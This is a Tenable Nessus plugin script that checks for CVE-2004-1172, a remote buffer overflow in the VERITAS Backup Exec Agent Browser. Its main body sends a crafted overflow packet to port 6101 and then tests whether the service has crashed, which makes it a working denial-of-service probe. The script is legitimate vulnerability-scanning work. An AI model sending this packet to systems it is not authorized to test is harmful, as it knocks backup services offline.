#
# (C) Tenable Network Security
#

if(description)
{
 script_id(16232);
 script_version("$Revision: 1.6 $");
 script_cve_id("CVE-2004-1172");
 script_bugtraq_id(11974);
 if ( defined_func("script_xref") ) script_xref(name:"IAVA", value:"2005-B-0001");

 name["english"] = "VERITAS Backup Exec Agent Browser Remote Buffer Overflow Vulnerability (DoS)";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

Arbitrary code can be executed on the remote host.

Description :

The remote host is running a version of VERITAS Backup Exec Agent Browser
which is vulnerable to a remote buffer overflow. An attacker may exploit this
flaw to execute arbitrary code on the remote host or to disable this service
remotely.

To exploit this flaw, an attacker would need to send a specially crafted packet
to the remote service.

Solution :

http://support.veritas.com/docs/273419

Risk factor :

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";


 script_description(english:desc["english"]);
 
 summary["english"] = "Test the VERITAS Backup Exec Agent Browser buffer overflow";

 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "Gain root remotely";
 script_family(english:family["english"]);
 
 script_require_ports(6101);
 exit(0);
}

port = 6101;
if (!get_port_state (port)) exit (0);

soc = open_sock_tcp (port);
if (!soc) exit (0);

request = raw_string (0x02, 0x00, 0x00, 0x00) + crap (data:'A', length:100) + raw_string (0x00) + "172.0.0.1" + raw_string (0x00);
send (socket:soc, data:request);

close (soc);

sleep(2);

soc = open_sock_tcp (port);
if ( ! soc )
{ 
  security_hole (port);
}
